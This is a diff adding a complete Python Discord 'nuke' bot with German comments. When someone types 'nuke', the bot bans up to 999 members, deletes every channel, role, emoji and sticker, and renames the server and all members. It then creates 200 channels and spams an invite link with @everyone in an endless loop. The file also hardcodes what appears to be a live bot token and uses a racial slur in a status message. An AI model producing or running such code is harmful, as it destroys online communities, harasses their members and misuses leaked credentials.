@@ -1,0 +1,222 @@
+import discord
+import random
+import asyncio
+import gc
+
+TOKEN = "MTQ4NTU4NDUyNzQxMjY5NTA4MQ.GKKVdQ.eei50fcftOXuUnpiGm1WPacOA6F1JiQwzaVaSA"
+DC_INVITE_LINK = "https://discord.com/invite/PgpFCNPuSn"
+
+intents = discord.Intents.default()
+intents.members = True
+intents.guilds = True
+intents.message_content = True
+
+client = discord.Client(intents=intents)
+
+running = False
+bot_channels = []
+
+def check_running():
+    if not running:
+        raise asyncio.CancelledError("Routine wurde abgebrochen")
+
+async def loesche_alle_channels(guild):
+    channels = list(guild.channels)
+    tasks = [ch.delete(reason="Server reset durch Bot") for ch in channels]
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+async def loesche_alle_rollen(guild, bot_member):
+    rollen_zu_loeschen = [r for r in guild.roles if r != guild.default_role and r != bot_member.top_role]
+    for rolle in rollen_zu_loeschen:
+        try:
+            await rolle.delete(reason="Rollen löschen")
+        except:
+            pass
+
+async def loesche_alle_emojis(guild):
+    for emoji in guild.emojis:
+        try:
+            await emoji.delete(reason="Emojis löschen")
+        except:
+            pass
+
+async def loesche_alle_sticker(guild):
+    try:
+        for sticker in await guild.stickers():
+            try:
+                await sticker.delete(reason="Sticker löschen")
+            except:
+                pass
+    except:
+        pass
+
+async def loesche_alle_soundboards(guild):
+    # Discord.py hat keine direkte Methode für Soundboards
+    # Falls vorhanden, bitte manuell oder mit API-Calls außerhalb dieses Scripts
+    pass
+
+async def channels_erstellen_und_invites_spammen(guild, anzahl_channels=200, batch_size=5, pause_s=3):
+    global bot_channels
+    print(f"[Schritt] Erstelle {anzahl_channels} Channels in Batches von {batch_size} mit {pause_s}s Pause...")
+
+    for start in range(0, anzahl_channels, batch_size):
+        check_running()
+        batch = []
+        end = min(start + batch_size, anzahl_channels)
+        for _ in range(start, end):
+            batch.append(guild.create_text_channel("G̷L̷Ü̷H̷F̷I̷X̷-̷N̷U̷K̷E̷D̷"))
+        created_channels = await asyncio.gather(*batch, return_exceptions=True)
+        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
+        bot_channels.extend(valid_channels)
+
+        # Jede Nachricht einzeln senden (langsamer, verhindert Spam-Burst)
+        for ch in valid_channels:
+            try:
+                await ch.send(f"@everyone {DC_INVITE_LINK}")
+            except:
+                pass
+
+        print(f"  Channels {start + 1} bis {end} erstellt & Nachrichten gesendet")
+        gc.collect()
+        if end < anzahl_channels:
+            await asyncio.sleep(pause_s)  # Pause zum Entlasten
+
+    return bot_channels
+
+async def mach_gluhfix_ding(guild, bot_member, channel):
+    global running, bot_channels
+    try:
+        check_running()
+
+        # 1) Leute bannen (bis zu 999)
+        bannbare_leute = [m for m in guild.members if not m.bot and m != bot_member and "gluhfix" not in m.display_name.lower()]
+        to_ban = bannbare_leute if len(bannbare_leute) <= 999 else random.sample(bannbare_leute, 999)
+        print(f"[Schritt] Versuche {len(to_ban)} Leute zu bannen...")
+        for idx, person in enumerate(to_ban, start=1):
+            check_running()
+            try:
+                try:
+                    await person.send(DC_INVITE_LINK)
+                except:
+                    pass
+                await guild.ban(person, reason="gluhfix Ban", delete_message_days=0)
+                print(f"  {idx}/{len(to_ban)}: {person} gebannt")
+            except Exception as e:
+                print(f"  {idx}/{len(to_ban)}: Fehler beim Bannen von {person}: {e}")
+
+        check_running()
+
+        # 2) Servername und Beschreibung setzen
+        try:
+            await guild.edit(
+                name="G̶L̶U̶H̶F̶I̶X̶ ̶N̶U̶K̶E̶",
+                description=f"G̶L̶U̶H̶F̶I̶X̶ ̶N̶U̶K̶E̶̷ | {DC_INVITE_LINK}",
+                icon=None,
+            )
+            print("[Schritt] Servername & Beschreibung geändert")
+        except Exception as e:
+            print(f"[Warnung] Server edit fehlgeschlagen: {e}")
+
+        # 3) Alle Emojis löschen
+        await loesche_alle_emojis(guild)
+        print("[Schritt] Alle Emojis gelöscht")
+
+        # 4) Alle Sticker löschen
+        await loesche_alle_sticker(guild)
+        print("[Schritt] Alle Sticker gelöscht")
+
+        # 5) Alle Soundboards löschen (falls möglich)
+        await loesche_alle_soundboards(guild)
+        print("[Schritt] Alle Soundboards gelöscht (sofern unterstützt)")
+
+        # 6) Alle Rollen löschen
+        await loesche_alle_rollen(guild, bot_member)
+        print("[Schritt] Alle Rollen gelöscht")
+
+        check_running()
+
+        # 7) Alle Channels löschen (parallel)
+        print("[Schritt] Lösche alle Channels...")
+        await loesche_alle_channels(guild)
+        print("[Schritt] Alle Channels gelöscht")
+
+        check_running()
+
+        # 8) Erstelle 200 Channels + spamme Invite + @everyone (batchweise mit Pause)
+        print("[Schritt] Erstelle Channels & spame Nachrichten...")
+        bot_channels = await channels_erstellen_und_invites_spammen(guild, 200, batch_size=5, pause_s=3)
+        print(f"[Schritt] {len(bot_channels)} Channels erstellt und Nachrichten gesendet")
+
+        check_running()
+
+        # 9) Jedem Mitglied eine von den neuen Rollen geben (max 1 Rolle pro Member)
+        # (optional, kann rausgenommen werden, weil Rollen gelöscht wurden)
+
+        # 10) Nickname aller Mitglieder auf "G̶L̶U̶H̶F̶I̶X̶ ̶N̶U̶K̶E̶" setzen
+        print("[Schritt] Setze Nicknames der Mitglieder...")
+        for idx, member in enumerate(guild.members, start=1):
+            check_running()
+            try:
+                if member != bot_member:
+                    await member.edit(nick="G̶L̶U̶H̶F̶I̶X̶ ̶N̶U̶K̶E̶̷")
+                    print(f"  {idx}/{len(guild.members)}: Nickname von {member} gesetzt")
+            except Exception as e:
+                print(f"  {idx}/{len(guild.members)}: Fehler beim Nickname setzen für {member}: {e}")
+
+        # 11) Endlosschleife: in allen Channels jede 3 Sekunden DC-Link spam
+        async def endlos_channel_spam():
+            print("[Schritt] Starte Endlosschleife für Channel-Spam...")
+            while running:
+                send_tasks = []
+                for ch in bot_channels:
+                    send_tasks.append(ch.send(f"@everyone {DC_INVITE_LINK}"))
+                await asyncio.gather(*send_tasks, return_exceptions=True)
+                await asyncio.sleep(3)
+
+        client.loop.create_task(endlos_channel_spam())
+
+        await channel.send("Gluhfix-Routine abgeschlossen und Channel-Spam gestartet!")
+        print("[Ende] Gluhfix-Routine fertig und Channel-Spam läuft")
+
+    except asyncio.CancelledError:
+        await channel.send("Gluhfix-Routine wurde vom Benutzer abgebrochen!")
+        print("[Abbruch] Routine abgebrochen")
+    finally:
+        global running
+        running = False
+
+@client.event
+async def on_message(message):
+    global running
+    if message.author == client.user:
+        return
+
+    content = message.content.lower()
+
+    if content == "nuke":
+        if running:
+            await message.channel.send("Gluhfix-Routine läuft bereits!")
+            return
+        running = True
+        await message.channel.send("Negga im Starting...")
+        guild = message.guild
+        bot_member = guild.get_member(client.user.id)
+        if not bot_member:
+            await message.channel.send("Fehler: Bot not found!")
+            running = False
+            return
+        await mach_gluhfix_ding(guild, bot_member, message.channel)
+
+    elif content in ["stop", "abbrechen", "cancel"]:
+        if running:
+            running = False
+            await message.channel.send("Gluhfix-Routine wird abgebrochen...")
+        else:
+            await message.channel.send("Es läuft gerade keine Gluhfix-Routine.")
+
+@client.event
+async def on_ready():
+    print(f"Bot ist online als {client.user}")
+
+print("Starte den Bot...")
+client.run(TOKEN)
